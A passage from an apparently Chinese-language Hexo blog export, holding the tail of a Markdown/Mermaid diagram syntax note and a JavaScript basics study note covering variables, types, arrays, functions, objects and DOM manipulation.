<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sequenceDiagram</span><br><span class="line">    participant Alice</span><br><span class="line">    participant Bob</span><br><span class="line">    Alice-&gt;&gt;John: Hello John, how are you?</span><br><span class="line">    loop Healthcheck</span><br><span class="line">        John-&gt;&gt;John: Fight against hypochondria</span><br><span class="line">    end</span><br><span class="line">    Note right of John: Rational thoughts &lt;br/&gt;prevail...</span><br><span class="line">    John--&gt;&gt;Alice: Great!</span><br><span class="line">    John-&gt;&gt;Bob: How about you?</span><br><span class="line">    Bob--&gt;&gt;John: Jolly good!</span><br></pre></td></tr></table></figure>



<h3 id="3-类图（Class-Diagram）"><a href="#3-类图（Class-Diagram）" class="headerlink" title="3. 类图（Class Diagram）"></a>3. 类图（Class Diagram）</h3><figure class="highlight m"><table><tr><td class="code"><pre><span class="line">classDiagram</span><br><span class="line">    class Animal &#123;</span><br><span class="line">        +String name</span><br><span class="line">        +void eat()</span><br><span class="line">    &#125;</span><br><span class="line">    class Dog &#123;</span><br><span class="line">        +void bark()</span><br><span class="line">    &#125;</span><br><span class="line">    class Cat &#123;</span><br><span class="line">        +void meow()</span><br><span class="line">    &#125;</span><br><span class="line">    Animal &lt;|-- Dog</span><br><span class="line">    Animal &lt;|-- Cat</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">classDiagram</span><br><span class="line">    class Animal &#123;</span><br><span class="line">        +String name</span><br><span class="line">        +void eat()</span><br><span class="line">    &#125;</span><br><span class="line">    class Dog &#123;</span><br><span class="line">        +void bark()</span><br><span class="line">    &#125;</span><br><span class="line">    class Cat &#123;</span><br><span class="line">        +void meow()</span><br><span class="line">    &#125;</span><br><span class="line">    Animal &lt;|-- Dog</span><br><span class="line">    Animal &lt;|-- Cat</span><br></pre></td></tr></table></figure>





<h3 id="4-状态图（State-Diagram）"><a href="#4-状态图（State-Diagram）" class="headerlink" title="4. 状态图（State Diagram）"></a>4. 状态图（State Diagram）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stateDiagram-v2</span><br><span class="line">    [*] --&gt; Still</span><br><span class="line">    Still --&gt; [*]</span><br><span class="line">    Still --&gt; Moving</span><br><span class="line">    Moving --&gt; Still</span><br><span class="line">    Moving --&gt; Crash</span><br><span class="line">    Crash --&gt; [*]</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stateDiagram-v2</span><br><span class="line">    [*] --&gt; Still</span><br><span class="line">    Still --&gt; [*]</span><br><span class="line">    Still --&gt; Moving</span><br><span class="line">    Moving --&gt; Still</span><br><span class="line">    Moving --&gt; Crash</span><br><span class="line">    Crash --&gt; [*]</span><br></pre></td></tr></table></figure>

<h3 id="5-甘特图（Gantt-Chart）"><a href="#5-甘特图（Gantt-Chart）" class="headerlink" title="5. 甘特图（Gantt Chart）"></a>5. 甘特图（Gantt Chart）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gantt</span><br><span class="line">    title 项目开发计划</span><br><span class="line">    dateFormat YYYY-MM-DD</span><br><span class="line">    section 第一阶段</span><br><span class="line">    工作A :a1, 2025-02-01, 10d</span><br><span class="line">    工作B :after a1, 15d</span><br><span class="line">    section 第二阶段</span><br><span class="line">    工作C :after b, 5d</span><br><span class="line">    Work D :2025-03-01, 7d</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gantt</span><br><span class="line">    title 项目开发计划</span><br><span class="line">    dateFormat YYYY-MM-DD</span><br><span class="line">    section 第一阶段</span><br><span class="line">    工作A :a1, 2025-02-01, 10d</span><br><span class="line">    工作B :after a1, 15d</span><br><span class="line">    section 第二阶段</span><br><span class="line">    工作C :after b, 5d</span><br><span class="line">    Work D :2025-03-01, 7d</span><br></pre></td></tr></table></figure>

<h3 id="6-饼图（Pie-Chart）"><a href="#6-饼图（Pie-Chart）" class="headerlink" title="6. 饼图（Pie Chart）"></a>6. 饼图（Pie Chart）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pie title 销售分布</span><br><span class="line">    &quot;产品A&quot; : 40</span><br><span class="line">    &quot;产品B&quot; : 10</span><br><span class="line">    &quot;产品C&quot; : 20</span><br><span class="line">    &quot;产品D&quot; : 30</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pie title 销售分布</span><br><span class="line">    &quot;产品A&quot; : 40</span><br><span class="line">    &quot;产品B&quot; : 10</span><br><span class="line">    &quot;产品C&quot; : 20</span><br><span class="line">    &quot;产品D&quot; : 30</span><br></pre></td></tr></table></figure>





<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>将单词或短语包裹在反引号 <strong>(`)** 中。但要创建**代码块**，应当将代码块前后使用连续三个 **```</strong> 包裹，并每行代码至少空一个tab符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">代码</span><br><span class="line">代码</span><br></pre></td></tr></table></figure>
<p>或使用html语法 <code>&lt;code&gt; &lt;/code&gt;</code></p>
<h2 id="分隔线"><a href="#分隔线" class="headerlink" title="分隔线"></a>分隔线</h2><p>在单独一行使用三个及以上的  <code>***或---或下划线___</code></p>
<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p><code>[超链接显示名](超链接地址 &quot;超链接title&quot;)</code><br>超链接title是鼠标悬停时显示的标题<br>使用尖括号可以把URL或者email地址变成可点击的链接，强调链接, 在链接语法前后增加星号。要将链接表示为代码，在方括号中添加反引号</p>
<h2 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h2><p>使用感叹号 (!), 然后在方括号增加替代文本，图片链接放在圆括号里，括号里的链接后可以增加一个可选的图片标题文本。<br><code>![图片alt](图片链接 &quot;图片title&quot;)</code><br>或使用html<code>&lt;img src=&quot;&quot; alt=&quot;&quot; title=&quot;&quot;&gt;</code></p>
]]></content>
      <categories>
        <category>其他语言技术</category>
        <category>其他技术</category>
      </categories>
      <tags>
        <tag>Markdown</tag>
      </tags>
  </entry>
  <entry>
    <title>L-JavaScript-Note</title>
    <url>/2024/05/11/L-JavaScript-Note/</url>
    <content><![CDATA[<p>Javascript基本语法速查</p>
<span id="more"></span>

<h1 id="一、基础语法"><a href="#一、基础语法" class="headerlink" title="一、基础语法"></a>一、基础语法</h1><table border="1" style="text-align: center;">
    <tr><td colspan="3">JavaScript</td></tr>
    <tr><td rowspan="2">ECMAScript</td><td colspan="2">Web APIs</td></tr>
    <tr><td>DOM</td><td>BOM</td></tr>
    <tr><td>规定js核心基础语法</td><td>文档操作，如对页面元素进行移动，增删</td><td>操作浏览器，如页面弹窗</td></tr>
</table>

<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.runoob.com/js/js-tutorial.html">菜鸟教程-javascript</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide">javascript指南</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web">mozilla-Web</a></p>
<h2 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h2><h3 id="书写位置"><a href="#书写位置" class="headerlink" title="书写位置"></a>书写位置</h3><ol>
<li><strong>内部JavaScript</strong><br>直接写在html文件里，用script标签包住<br>规范:script标签写在<code>&lt;/body&gt;</code>上面<br>拓展: alert(‘你好，js’)页面弹出警告对话框</li>
<li><strong>外部JavaScript</strong><br>代码写在以.js结尾的文件里<br>语法:通过script标签，引入到html页面中。<br><code>&lt;script src = &quot;a.js&quot;&gt;&lt;/script&gt;</code>script标签之间无需写任何代码，会被忽略 </li>
<li><strong>内联JavaScript</strong><br>代码直接写在标签内部，script属性中</li>
</ol>
<h3 id="注释："><a href="#注释：" class="headerlink" title="注释："></a>注释：</h3><p><strong>单行注释</strong><br>符号:&#x2F;&#x2F;<br>作用:&#x2F;&#x2F;右边这一行的代码会被忽略<br>快捷键:ctrl+&#x2F;</p>
<p><strong>块注释</strong><br>符号:&#x2F;**&#x2F;<br>作用:在&#x2F;<em>和</em>&#x2F;之间的所有内容都会被忽略<br>快捷键:shift+alt+a</p>
<p><strong>结束符</strong><br>作用: 使用英文的;代表语句结束<br>实际情况: 实际开发中，可写可不写，浏览器(avaScript 引擎) 可以自动推断语句的结束位置<br>现状:在实际开发中，越来越多的人主张，书写JavaScript 代码时省略结束符<br>约定:为了风格统一，结束符要么每句都写，要么每句都不写(按照团队要求.)</p>
<h3 id="输入输出"><a href="#输入输出" class="headerlink" title="输入输出"></a>输入输出</h3><p><strong>输出语法</strong></p>
<ol>
<li>语法1:<code>document.write(&#39;要出的内容&#39;)</code><br>作用:向body内输出内容</li>
<li>语法2:<code>alert(&#39;要出的内容&#39;)</code><br>作用:页面弹出警告对话框<br>注意:如果输出的内容写的是标签，也会被解析成网页元素</li>
<li>语法3:<code>console.log(&#39;控制台打印&#39;)</code><br>作用:控制台输出语法，程序员调试使用</li>
</ol>
<p>示例：<br>若用<code>document.write(&#39;\&lt;h1\&gt;dad\&lt;/h1\&gt;&#39;)</code>会在页面输出一个名字叫dad的一级标题</p>
<p><strong>输入语法</strong><br><code>prompt(&#39;请输入您的姓名:&#39;)</code><br>作用:显示一个对话框，对话框中包含一条文字信息，用来提示用户输入文字</p>
<h2 id="数据元素，函数和运算符"><a href="#数据元素，函数和运算符" class="headerlink" title="数据元素，函数和运算符"></a>数据元素，函数和运算符</h2><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>声明：与c相似，多个用,分隔<br>语法: <code>let 变量名</code> or <code>var 变量名</code><br>说明：旧版本使用var声明<br>赋值：a&#x3D;b，与c语言一致，可以在声明的同时赋值<br>更新：同c</p>
<p>变量名要求：</p>
<ul>
<li>不能用关键字<br> 关键字:有特殊含义的字符，JavaScript 内置的一些英语词汇。例如:let、var、if、for等</li>
<li>只能用下划线、字母、数字、$组成，且数字不能开头</li>
<li>字母严格区分大小写，如 Age 和 age 是不同的变量</li>
</ul>
<h3 id="常量const"><a href="#常量const" class="headerlink" title="常量const"></a>常量const</h3><p>声明：<code>const a=ffff;</code><br>数据永不改变，不允许重新赋值，声明同时初始化。</p>
<h3 id="数据类型（类似python）"><a href="#数据类型（类似python）" class="headerlink" title="数据类型（类似python）"></a>数据类型（类似python）</h3><p>数字型：所有数字， NaN错误结果<br>字符串：所有使用单双反引号括起来的数据，单双没有区分，反引号括起表示模板字符串，单引号双引号可以相互嵌套，但不可自己嵌套，也可以用转义符&#x2F;，拼接直接用+<br>布尔型：true or false 都是小写<br>未定义型：只声明未定义<br>空型：null</p>
<p>数据类型的检测：<br>通过 <code>typeof</code>关键字检测数据类型，支持两种语法形式:</p>
<ol>
<li>作为运算符:<code>typeof x</code>,(常用的写法)</li>
<li>函数形式:<code>typeof(x)</code><br>换言之，有括号和没有括号，得到的结果是一样的，所以我们直接使用运算符的写法</li>
</ol>
<h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><p>某些运算符被执行时，系统内部自动将数据类型进行转换，这种转换称为隐式转换<br>规则:</p>
<ul>
<li>+号两边只要有一个是字符串，都会把另外一个转成字符串</li>
<li>除了+以外的算术运算符 比如-*&#x2F;等都会把数据转成数字类型<br>缺点:</li>
<li>转换类型不明确，靠经验才能总结<br>小技巧:</li>
<li>+号作为正号解析可以转换成数字型</li>
<li>任何数据和字符串相加结果都是字符串</li>
</ul>
<p>显示转换:<br>字符-&gt;数字<br>Number(str):必须是字符串的数字，pare会自动忽略字母和其他字符</p>
<p>Number(数据)</p>
<ul>
<li>转成数字类型</li>
<li>如果字符串内容里有非数字，转换失败时结果为NaN(NotaNumber)即不是一个数字</li>
<li>NaN也是number类型的数据，代表非数字</li>
</ul>
<p>parseInt(数据)</p>
<ul>
<li>只保留整数</li>
</ul>
<p>parseFloat(数据)</p>
<ul>
<li>可以保留小数</li>
</ul>
<h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><p>赋值：&#x3D;, +&#x3D;, -&#x3D;,<br>一元：++­­­­, --(同c,有前置后置)<br>比较：&gt;, &lt;, &#x3D;, &lt;&#x3D;, &gt;&#x3D;, &#x3D;&#x3D;, !&#x3D;, &#x3D;&#x3D;&#x3D;(类型和数值均相等，推荐使用),!&#x3D;&#x3D;<br>逻辑：!, &amp;&amp;, ||<br>三元：? : (同c),</p>
<h3 id="IF-switch-while-for语句同c语言"><a href="#IF-switch-while-for语句同c语言" class="headerlink" title="IF,switch,while,for语句同c语言,"></a>IF,switch,while,for语句同c语言,</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(score &gt;=<span class="number">98</span>)&#123;</span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&#x27;成绩优秀，宝贝，你是我的骄傲&#x27;</span>)</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(score &gt;=<span class="number">78</span>)&#123;</span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&#x27;成绩良好，宝贝，你要加油哦~~&#x27;</span>)</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(score &gt;=<span class="number">60</span>)&#123;</span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&#x27;成绩及格，宝贝，你很危险&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>循环也有continue和break</p>
<ul>
<li>break:退出循环</li>
<li>continue：结束本次循环</li>
</ul>
<h3 id="数组的基本使用"><a href="#数组的基本使用" class="headerlink" title="数组的基本使用"></a>数组的基本使用</h3><ol>
<li>声明语法<br>let 数组名 &#x3D; [数据1，数据2,…，数据n]</li>
<li>增删<ul>
<li>数组添加新的数据<br> arr.push(新增的内容)<br> arr.unshift(新增的内容)</li>
<li>删除数组中数据<br> arr.pop()<br> arr.shift()<br> arr.splice(操作的下标,删除的个数)</li>
</ul>
</li>
<li>获取长度<br>语法：<code>names.length</code></li>
</ol>
<p><code>arr.unshift(新增的内容)</code>方法将一个或多个元素添加到数组的开头，并返回该数组的新长度<br>语法:<code>arr.unshift(元素1,..,元素n)</code><br><code>arr.push()</code>方法将一个或多个元素添加到数组的末尾，并返回该数组的新长度(重点)<br>语法:<code>arr.push(元素1,..,元素n)</code><br><code>arr.pop()</code>方法从数组中删除最后一个元素，并返回该元素的值<br>语法:<code>arr.pop()</code><br><code>arr.shift()</code>方法从数组中删除第一个元素，并返回该元素的值<br>语法:<code>arr.shift()</code><br><code>arr.splice()</code>方法 删除指定元素<br>语法:<code>arr.splice(起始位置，删除几个元素)</code></p>
<h3 id="断点调试"><a href="#断点调试" class="headerlink" title="断点调试"></a>断点调试</h3><p>作用:学习时可以帮助更好的理解代码运行，工作时可以更快找到bug<br>浏览器打开调试界面</p>
<ol>
<li>按F12打开开发者工具</li>
<li>点到sources一栏</li>
<li>选择代码文件</li>
</ol>
<h3 id="函数与封装"><a href="#函数与封装" class="headerlink" title="函数与封装"></a>函数与封装</h3><p>1.声明：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> 函数名()&#123;</span><br><span class="line">函数体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>参数的写法和python一样，无需写明数据类型，可以设置默认参数，类似python</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getSum</span>(<span class="params">x=<span class="number">0</span>,y=<span class="number">0</span></span>)&#123;</span><br><span class="line">   <span class="variable language_">document</span>.<span class="title function_">write</span>(x+y)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>x&#x3D;0，y&#x3D;0是默认值，函数优先使用传递的实参，当缺少实参时使用默认值，使用return返回返回值</p>
<p>匿名函数：</p>
<ol>
<li>函数表达式<br>将匿名函数赋值给一个变量，并且通过变量名称进行调用 我们将这个称为函数表达式<br>语法:<code>let fn = function()&#123;函数体&#125;</code></li>
<li>调用:<code>fn()</code> &#x2F;&#x2F; 函数名()<br>其中函数的形参和实参使用跟具名函数一致</li>
</ol>
<p>立即执行函数<br>场景介绍:避免全局变量之间的污染<br>语法:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//方式1</span></span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">11</span>)&#125;)();</span><br><span class="line"><span class="comment">// 方式2</span></span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">11</span>)&#125;());</span><br><span class="line"><span class="comment">//不需要调用，立即执行</span></span><br></pre></td></tr></table></figure>

<h2 id="对象（类似c-的类）"><a href="#对象（类似c-的类）" class="headerlink" title="对象（类似c++的类）"></a>对象（类似c++的类）</h2><h3 id="对象的声明与使用"><a href="#对象的声明与使用" class="headerlink" title="对象的声明与使用"></a>对象的声明与使用</h3><ol>
<li>对象声明语法<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> 对象名 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> 对象名 = <span class="keyword">new</span> <span class="title class_">Object</span>()</span><br></pre></td></tr></table></figure></li>
<li>对象有属性和方法组成<br>属性:信息或叫特征(名词)。比如 手机尺寸、颜色、重量等.<br>方法:功能或叫行为(动词)。比如 手机打电话、发短信、玩游戏.<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> 对象名=&#123;</span><br><span class="line">   属性名:属性值</span><br><span class="line">   方法名:函数</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>属性<br>据描述性的信息称为属性，如人的姓名、身高、年龄、性别等，一般是名词性的<br>属性都是成对出现的，包括属性名和值，它们之间使用英文:分隔<br>多个属性之间使用英文，分隔<br>属性就是依附在对象上的变量(外面是变量，对象内是属性)<br>属性名可以使用””或”，一般情况下省略，除非名称遇到特殊符号如空格、中横线等</li>
</ol>
<h3 id="对象的增删改查"><a href="#对象的增删改查" class="headerlink" title="对象的增删改查"></a>对象的增删改查</h3><ol>
<li>增改<br>语法:对象名.属性&#x3D;新值<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> person =&#123;</span><br><span class="line"><span class="attr">age</span>: <span class="number">18</span>,</span><br><span class="line"><span class="attr">gender</span>:<span class="string">&#x27;女&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">person.<span class="property">gender</span>=<span class="string">&#x27;男&#x27;</span></span><br></pre></td></tr></table></figure>
已有的属性通过这个方式就是修改，没有就是增加</li>
<li>删<br>语法:delete 对象名.属性<br>（一般不允许）</li>
</ol>
<h3 id="对象的方法和遍历（类似python，以for-let-a-in-list-的方式）"><a href="#对象的方法和遍历（类似python，以for-let-a-in-list-的方式）" class="headerlink" title="对象的方法和遍历（类似python，以for(let a in list)的方式）"></a>对象的方法和遍历（类似python，以for(let a in list)的方式）</h3><p>数据行为性的信息称为方法，如跑步、唱歌等，一般是动词性的，其本质是函数</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> person =&#123;</span><br><span class="line">   <span class="attr">name</span>:<span class="string">&#x27;andy&#x27;</span></span><br><span class="line">   <span class="attr">sayHi</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">   <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;hi~~&#x27;</span>)</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>方法是由方法名和函数两部分构成，它们之间使用:分隔</li>
<li>多个属性之间使用英文，分隔</li>
<li>方法是依附在对象中的函数</li>
<li>方法名可以使用””或”,一般情况下省略，除非名称遇到特殊符号如空格、中横线等</li>
</ol>
<p>遍历对象</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> obj =&#123;</span><br><span class="line"><span class="attr">uname</span>: <span class="string">&#x27;andy&#x27;</span>,</span><br><span class="line"><span class="attr">age</span>: <span class="number">18</span>,</span><br><span class="line"><span class="attr">sex</span>:<span class="string">&#x27;男</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">for(let k in obj)&#123;</span></span><br><span class="line"><span class="string">console.log(k)//打印属性</span></span><br><span class="line"><span class="string">console.log(obj[k])//打印属性值</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>一般不用这种方式遍历数组、主要是用来遍历对象</li>
<li>for in语法中的k是一个变量,在循环的过程中依次代表对象的属性名</li>
<li>由于k是变量，所以必须使用[]语法解析</li>
<li>一定记住:k是获得对象的属性名，对象名[k]是获得 属性值<br>注意：这种方法不推荐用于遍历数组，因为遍历数组时，不同于python，这里的a会是序号（的字符串）；当遍历对象时，k会是属性名（字符串）</li>
</ul>
<p>对象里面是无序的键值对，没有规律.不像数组里面有规律的下标</p>
<h3 id="内置对象-MATH（数学相关）"><a href="#内置对象-MATH（数学相关）" class="headerlink" title="内置对象_MATH（数学相关）"></a>内置对象_MATH（数学相关）</h3><p>Math对象包含的方法有:<br>random:生成0-1之间的随机数(包含0不包括1)<br>ceil:向上取整<br>floor:向下取整<br>max:找最大数<br>min:找最小数<br>pow:幂运算<br>abs:绝对值<br>round:取近似值，过5才进<br>random无参数,产生N-M的随机数采用<br><code>Math.floor(Math.random() * (M-N+1))+N</code></p>
<h3 id="简单（值）数据类型与复杂数据类型（引用）"><a href="#简单（值）数据类型与复杂数据类型（引用）" class="headerlink" title="简单（值）数据类型与复杂数据类型（引用）"></a>简单（值）数据类型与复杂数据类型（引用）</h3><p>值类型:简单数据类型&#x2F;基本数据类型，在存储时变量中存储的是值本身，因此叫做值类型<br>string,number,boolean,undefined,null<br>引用类型:复杂数据类型，在存储时变量中存储的仅仅是地址(引用)，因此叫做引用数据类型<br>通过 new 关键字创建的对象(系统对象、自定义对象)，如 0bject、Array、Date等</p>
<p>1、栈(操作系统):由操作系统自动分配释放存放函数的参数值、局部变量的值等。其操作方式类似于数据结构中的栈。简单数据类型存放到栈里面<br>2、堆(操作系统):存储复杂类型(对象)，一般由程序员分配释放，若程序员不释放，由垃圾回收机制回收。引用数据类型存放到堆里面</p>
<p>引用类型变量(栈空间)里存放的是地址，真正的对象实例存放在堆空间中<br>引用类型(复杂数据类型):通过 new 关键字创建的对象(系统对象、自定义对象)，如 Object、Array、Date等</p>
<h3 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt; arr.<span class="property">length</span>; i++)&#123;</span><br><span class="line">   <span class="string">`document.write(</span></span><br><span class="line"><span class="string">   &lt;div style=&quot;height: <span class="subst">$&#123;arr[i]&#125;</span>px;&quot;&gt;</span></span><br><span class="line"><span class="string">   &lt;span&gt;<span class="subst">$&#123;arr[i]&#125;</span>&lt;/span&gt;</span></span><br><span class="line"><span class="string">   &lt;h4&gt;第<span class="subst">$&#123;i + <span class="number">1</span>&#125;</span>季度&lt;/h4&gt;</span></span><br><span class="line"><span class="string">   &lt;/div&gt;)</span></span><br><span class="line"><span class="string">   `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="二、web-apis"><a href="#二、web-apis" class="headerlink" title="二、web apis"></a>二、web apis</h1><h3 id="const常量声明优先"><a href="#const常量声明优先" class="headerlink" title="const常量声明优先"></a>const常量声明优先</h3><p>const可以用于修饰属性发生改变的引用类型，因为地址不变，但不可以整体重新赋值（地址改变）</p>
<h2 id="DOM获取元素"><a href="#DOM获取元素" class="headerlink" title="DOM获取元素"></a>DOM获取元素</h2><h3 id="API及dom基础认知"><a href="#API及dom基础认知" class="headerlink" title="API及dom基础认知"></a>API及dom基础认知</h3><p>作用: 就是使用 JS 去操作html和浏览器<br>分类:DOM(文档对象模型)、BOM(浏览器对象模型)<br>DOM(Document Object Model–文档对象模型)是用来呈现以及与任意 HTML或XML文档交互的AP<br>白话文:DOM是浏览器提供的一套专门用来<em>操作网页内容</em>的功能<br>DOM作用</p>
<ul>
<li>开发网页内容特效和实现用户交互<br>DOM示例演示</li>
</ul>
<h3 id="dom树和dom对象"><a href="#dom树和dom对象" class="headerlink" title="dom树和dom对象"></a>dom树和dom对象</h3><p>DOM树是什么</p>
<ul>
<li>将 HTML文档以树状结构直观的表现出来，我们称之为文档树或 DOM 树</li>
<li>描述网页内容关系的名词</li>
<li>作用:文档树直观的体现了标签与标签之间的关系</li>
</ul>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/55638d59acc62f536727d0182cabfe7e.png" alt="dom tree"></p>
<p>DOM对象:浏览器根据html标签生成的J5对象</p>
<ul>
<li>所有的标签属性都可以在这个对象上面找到</li>
<li>修改这个对象的属性会自动映射到标签身上</li>
</ul>
<p>document 对象</p>
<ul>
<li>是 DOM 里提供的一个对象</li>
<li>所以它提供的属性和方法都是用来访问和操作网页内容的<br>例:dpcument.write()</li>
<li>网页所有内容都在document里面</li>
</ul>
<h3 id="获取dom对象"><a href="#获取dom对象" class="headerlink" title="获取dom对象"></a>获取dom对象</h3><ol>
<li><p>跟据C55选择器来获取DOM元素(重点)</p>
<ul>
<li>选择匹配的第一个元素</li>
<li>语法:<code>document.querySelector(&#39;css选择器&#39;)</code></li>
<li>参数：包含一个或多个有效的CSS选择器字符串</li>
<li>返回值：选择器匹配的第一个元素</li>
</ul>
</li>
<li><p>择匹配的多个元素</p>
<ul>
<li>语法:<code>document.querySelectorA1l(&#39;css选择器&#39;)</code></li>
<li>参数:包含一个或多个有效的CSS选择器 字符串</li>
<li>返回值:CSS选择器匹配的NodeList 对象集合</li>
<li>得到的是一个伪数组，有长度有索引号，但是没有 pop()push()等数组方法。想要得到里面的每一个对象，则需要遍历(for)的方式获得。</li>
</ul>
</li>
<li><p>其他获取DOM元素方法(了解)</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 根据id获取一个元素</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;nav&#x27;</span>)</span><br><span class="line"><span class="comment">//根据 标签获取一类元素 获取页面 所有div</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;div&#x27;</span>)</span><br><span class="line"><span class="comment">//根据类名获取元素 获取页面 所有类名为 w的</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&#x27;w&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="操作元素内容（常见属性和style属性）"><a href="#操作元素内容（常见属性和style属性）" class="headerlink" title="操作元素内容（常见属性和style属性）"></a>操作元素内容（常见属性和style属性）</h3><h4 id="通过-style-属性操作CSS"><a href="#通过-style-属性操作CSS" class="headerlink" title="通过 style 属性操作CSS"></a>通过 style 属性操作CSS</h4><p>语法:<br><code>对象.style.样式属性 =值</code><br>举例说明</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> box=<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.box&#x27;</span>)</span><br><span class="line"><span class="comment">// 修改元素样式</span></span><br><span class="line">box.<span class="property">style</span>.<span class="property">width</span>=<span class="string">&#x27;200px&#x27;</span></span><br><span class="line">box.<span class="property">style</span>.<span class="property">marginTop</span> =<span class="string">&#x27;15px&#x27;</span></span><br><span class="line">box.<span class="property">style</span>.<span class="property">backgroundColor</span> =<span class="string">&#x27;pink&#x27;</span></span><br></pre></td></tr></table></figure>
<p>注意:</p>
<ul>
<li>修改样式通过style属性引出</li>
<li>如果属性有-连接符，需要转换为小驼峰命名法</li>
<li>赋值的时候，需要的时候不要忘记加cSS单位</li>
</ul>
<p>1 innerText和innerHtml属性:<br>1、无赋值可以直接获取内容<br>2、有赋值可以修改<br>3、text不解析标签，html解析标签</p>
<ol>
<li>innertext属性<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.获取元素</span></span><br><span class="line"><span class="keyword">const</span> box= <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.box&#x27;</span>)</span><br><span class="line"><span class="comment">//2、修改文字内容 对象.innerText 属性</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(box.<span class="property">innerText</span>)<span class="comment">// 获取文字内容</span></span><br><span class="line">box.<span class="property">innerText</span>=<span class="string">&#x27;我是一个盒子&#x27;</span><span class="comment">//修改</span></span><br></pre></td></tr></table></figure></li>
<li>innerHTML属性<br>将文本内容添加&#x2F;更新到任意标签位置，会解析标签，多标签建议使用模板字符<br>举例说明<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> info = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.info&#x27;</span>)</span><br><span class="line"><span class="comment">// 获取标签内部的文字</span></span><br><span class="line"><span class="comment">//添加/修改标签内部文字内容</span></span><br><span class="line">info.<span class="property">innerHTML</span> =<span class="string">&#x27;嗨喽,俺是&lt;strong&gt;刘德华&lt;/strong&gt;~&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="通过className修改样式"><a href="#通过className修改样式" class="headerlink" title="通过className修改样式"></a>通过className修改样式</h4><p>如果修改的样式比较多，直接通过style属性修改比较繁琐，我们可以通过借助于c55类名的形式<br>语法:</p>
